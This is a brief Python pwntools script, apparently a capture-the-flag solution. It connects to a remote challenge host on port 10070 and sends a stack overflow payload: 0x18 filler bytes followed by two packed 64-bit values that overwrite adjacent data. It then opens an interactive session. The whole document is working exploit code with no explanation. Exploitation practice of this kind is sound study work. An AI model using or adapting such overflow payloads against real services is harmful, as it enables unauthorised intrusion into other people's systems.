from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10070)
payload = b'a'*0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)
io.sendline(payload)
io.interactive()